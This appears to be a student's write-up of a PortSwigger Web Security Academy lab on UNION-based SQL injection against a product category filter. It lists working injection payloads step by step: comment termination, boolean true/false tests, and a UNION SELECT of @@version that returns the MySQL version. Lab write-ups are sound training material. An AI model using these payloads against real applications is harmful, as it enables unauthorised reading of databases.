
# 4 - SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. (Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2')

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------

Generated link: https://0aab0018030112cfc1c781f9007c009c.web-security-academy.net/

Filtering using GET parameter “category”: "/filter?category=Accesories"

/filter?category=Accesories -> Return 4 items

/filter?category=Accessories';# -> Return 4 items, the query is finished

/filter?category=Accessories'+and+'1'='1  -> Return 4 items

/filter?category=Accessories'+and+'1'='0  -> Return 0 items

/filter?category=Accessories'+union+select+0,@@version;# -> Print version

```
GET /filter?category=Accessories'+union+select+0,@@version;# HTTP/2
``` 

![img](images/4%20-%20SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/1.png)